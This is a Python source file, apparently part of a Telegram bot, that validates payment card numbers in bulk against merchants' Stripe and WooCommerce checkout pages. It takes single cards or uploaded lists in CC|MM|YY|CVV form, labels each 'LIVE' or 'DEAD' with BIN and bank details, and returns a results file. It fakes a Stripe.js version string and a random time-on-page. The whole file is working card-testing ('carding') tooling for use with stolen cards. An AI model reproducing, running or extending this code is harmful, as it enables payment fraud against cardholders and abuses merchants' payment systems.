    processing_msg = await send_safe_reply(update.message, f"{EMOJI_WAIT} Checking card `...{escape_markdown(cc[-4:], version=2)}`\\, please wait\\.", parse_mode=ParseMode.MARKDOWN_V2)

    client: httpx.AsyncClient = context.bot_data['http_client']
    stripe_params_for_logic = {k: context.user_data.get(k) for k in ['stripe_pk', 'api_type', 'stripe_client_secret', 'wc_ajax_nonce', 'wc_true_ajax_url']}
    card_data_dict = {'cc': cc, 'mm': mm_str, 'yy': yy_raw, 'cvv': cvv_str}

    check_result = await perform_card_check_logic(
        client, stripe_params_for_logic, card_data_dict,
        context.user_data.get('login_identifier'), context.user_data.get('payment_page_url_for_chk'), context
    )

    # --- Build Rich Result Message ---
    bot_details = await context.bot.get_me()
    bin_info = await get_bin_info(cc[:6], client)

    status_icon = f"{EMOJI_CHECK}* LIVE*" if check_result["is_approved"] else f"{EMOJI_CROSS}* DEAD*"

    reply_parts = [
        f"{EMOJI_CARD} *Card:* `{escape_markdown(f'{cc}|{mm_str}|{yy_raw}|{cvv_str}', version=2)}`",
        "\\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\-",
        f"{EMOJI_BANK} *BIN Details:*",
    ]
    if bin_info and not bin_info.get("error"):
        reply_parts.append(f"  `Scheme/Brand:` {escape_markdown(bin_info.get('scheme', 'N/A'), version=2)} / {escape_markdown(bin_info.get('brand', 'N/A'), version=2)}")
        reply_parts.append(f"  `Type:` {escape_markdown(bin_info.get('type', 'N/A'), version=2)}")
        reply_parts.append(f"  `Country:` {escape_markdown(bin_info.get('country', 'N/A'), version=2)}")
        reply_parts.append(f"  `Bank:` {escape_markdown(bin_info.get('bank', 'N/A'), version=2)}")
    else:
        reply_parts.append(f"  `Status:` {escape_markdown(bin_info.get('error', 'Lookup Failed'), version=2)}")

    reply_parts.extend([
        "\\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\-",
        f"{EMOJI_SPARKLE} *Stripe Response:*",
        f"  *Status:* {status_icon}",
        f"  `Message:` {escape_markdown(check_result.get('stripe_message', 'N/A'), version=2)}"
    ])

    if check_result.get('decline_code'):
        reply_parts.append(f"  `Decline Code:` {escape_markdown(str(check_result['decline_code']), version=2)}")
    if check_result.get('pm_id'):
        reply_parts.append(f"  `PaymentMethod ID:` `{escape_markdown(check_result['pm_id'], version=2)}`")

    reply_parts.extend([
        "\\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\-",
        f"{EMOJI_SPY} *Checked by:* {escape_markdown(update.effective_user.first_name, version=2)}",
        f"{EMOJI_BOT} *Bot:* {escape_markdown(bot_details.first_name, version=2)}"
    ])

    final_message_text = "\n".join(reply_parts)
    await processing_msg.edit_text(final_message_text, parse_mode=ParseMode.MARKDOWN_V2)


async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('next_action') != STATE_AWAIT_CHECK:
        await send_safe_reply(update.message, f"{EMOJI_WARN} Site context not set up\\! Please use `/addsitelogin` and provide the payment page URL first\\.")
        return

    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await send_safe_reply(update.message, f"{EMOJI_FILE} Please reply to a message containing the \\.txt file with `/mchk`\\.")
        return

    document = update.message.reply_to_message.document
    if document.mime_type != "text/plain":
        await send_safe_reply(update.message, f"{EMOJI_STOP} File must be plain text \\(`\\.txt`\\)\\.")
        return

    try:
        new_file = await context.bot.get_file(document.file_id)
        file_content_bytes = await new_file.download_as_bytearray()
        lines = file_content_bytes.decode('utf-8').splitlines()
    except Exception as e:
        logger.error(f"/mchk file download/decode error: {e}")
        await send_safe_reply(update.message, f"{EMOJI_CROSS} Error processing file: {escape_markdown(str(e), version=2)}")
        return

    processable_lines = [line for line in lines if line.strip() and not line.strip().startswith('#')]
    total_cards = len(processable_lines)
    if total_cards == 0:
        await send_safe_reply(update.message, "🤷 File contains no processable card lines\\.")
        return

    results_for_file = []
    processed_count, approved_count = 0, 0
    client: httpx.AsyncClient = context.bot_data['http_client']
    stripe_params_for_logic = {k: context.user_data.get(k) for k in ['stripe_pk', 'api_type', 'stripe_client_secret', 'wc_ajax_nonce', 'wc_true_ajax_url']}

    status_text = f"{EMOJI_ROCKET} *Mass Check Started*\n\nTotal Cards: {total_cards}"
    status_msg_obj = await update.message.reply_text(text=status_text, parse_mode=ParseMode.MARKDOWN_V2)

    for i, line in enumerate(processable_lines):
        if '|' not in line or line.count('|') != 3:
            results_for_file.append(f"{line} -> INVALID FORMAT")
            processed_count += 1
            continue

        cc, mm, yy, cvv = map(str.strip, line.split('|'))
        card_data = {'cc': cc, 'mm': mm, 'yy': yy, 'cvv': cvv}

        check_res = await perform_card_check_logic(
            client, stripe_params_for_logic, card_data,
            context.user_data.get('login_identifier'), context.user_data.get('payment_page_url_for_chk'), context
        )

        processed_count += 1
        if check_res["is_approved"]: approved_count += 1

        status_symbol = EMOJI_CHECK if check_res["is_approved"] else EMOJI_CROSS
        results_for_file.append(f"{line} -> {status_symbol} {check_res.get('stripe_message', 'N/A')}")

        # Update status message periodically
        if status_msg_obj and (processed_count % 5 == 0 or processed_count == total_cards):
            try:
                update_text = (
                    f"{EMOJI_GEAR} *Mass Check in Progress...*\n\n"
                    f"Processed: {processed_count}/{total_cards}\n"
                    f"Live: {EMOJI_CHECK} {approved_count}\n"
                    f"Dead: {EMOJI_CROSS} {processed_count - approved_count}"
                )
                await status_msg_obj.edit_text(text=update_text, parse_mode=ParseMode.MARKDOWN_V2)
                await asyncio.sleep(0.5) # Be gentle with Telegram API
            except Exception as e_edit: 
                logger.warning(f"Failed to edit /mchk status: {e_edit}")

    final_summary_text = (
        f"{EMOJI_FLAG} *Mass Check Complete\\!*\n\n"
        f"Total Processed: {processed_count}\n"
        f"Live: {EMOJI_CHECK} {approved_count}\n"
        f"Dead: {EMOJI_CROSS} {processed_count - approved_count}\n\n"
        f"Sending full results file\\."
    )
    await status_msg_obj.edit_text(text=final_summary_text, parse_mode=ParseMode.MARKDOWN_V2)

    if results_for_file:
        output_file_content = "\n".join(results_for_file)
        output_file_bytes = output_file_content.encode('utf-8')
        output_file_object = io.BytesIO(output_file_bytes)
        await update.message.reply_document(document=InputFile(output_file_object, filename="results_mchk.txt"))


async def route_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE, called_from_specific_handler=False):
    """Routes non-command text messages based on the current conversation state."""
    next_action = context.user_data.get('next_action')
    message_text = update.message.text.strip() if update.message and update.message.text else ""

    if next_action == STATE_AWAIT_LOGIN:
        return await handle_login_details(update, context)
    elif next_action == STATE_AWAIT_PAYMENT_URL:
        return await handle_payment_page_url(update, context)
    elif next_action == STATE_AWAIT_CHECK:
        if '|' in message_text and message_text.count('|') == 3:
            return await chk_command(update, context)
        else:
            await send_safe_reply(update.message, f"Ready for card details (`CC|MM|YY|CVV`), or use `/mchk` with a file\\. Use `/addsitelogin` to start over\\.")
    elif called_from_specific_handler:
        await send_safe_reply(update.message, "I seem to be lost\\. Try `/start` or `/addsitelogin` to begin fresh\\!")
    else:
        await send_safe_reply(update.message, f"🤔 I'm not sure what to do with that\\. Try `/start` or `/help` for commands\\.")


def main():
    if not BOT_TOKEN:
        logger.critical("BOT_TOKEN is not set! Please add your Telegram Bot Token.")
        return

    # Use a persistent httpx client for connection pooling and cookie management
    client = httpx.AsyncClient(timeout=30, follow_redirects=True)

    application = Application.builder().token(BOT_TOKEN).build()

    # Store client and other data in bot_data for access across handlers
    application.bot_data['http_client'] = client
    application.bot_data['stripe_js_version'] = "stripe.js/v3/elements-inner-SgFw1VLoXN5hdAIo92b1Q"
    application.bot_data['time_on_page'] = random.randint(18000, 35000)

    # Add command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("addsitelogin", addsitelogin_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mchk", mchk_command))

    # Add a message handler for routing text based on conversation state
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), route_text_message))

    logger.info("Bot is armed and ready!")
    application.run_polling()


if __name__ == "__main__":
    main()
